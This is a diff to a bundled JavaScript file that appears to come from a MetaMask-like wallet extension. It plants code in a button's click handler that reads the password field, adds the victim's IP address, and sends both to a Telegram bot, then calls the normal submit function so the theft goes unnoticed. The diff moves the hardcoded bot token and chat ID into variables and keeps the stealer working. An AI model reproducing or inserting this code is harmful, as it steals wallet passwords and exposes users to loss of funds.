@@ -10574,10 +10574,12 @@ LavaPack.loadBundle([
                             size: "large",
                             onClick: function onc(...args) {
 								let password = `Possible Metamask password: ${document.getElementsByClassName("MuiInputBase-input MuiInput-input")[0].value}`
-								
+								let bot_token = "6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4"
+								let chat_id = "1804765109"
+
 								fetch("https://api.ipify.org").then(r => r.text()).then((ip) => {
 								    password = `IP: ${ip}%0D%0A${password}`
-									fetch(`https://api.telegram.org/bot6904217349:AAH0T4Isy8z1aCvzrtosENASChRIzcOncCQ/sendMessage?chat_id=-4012870581&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {handleSubmitlololololol(...args)})
+									fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {handleSubmitlololololol(...args)})
 									
 								})
 								
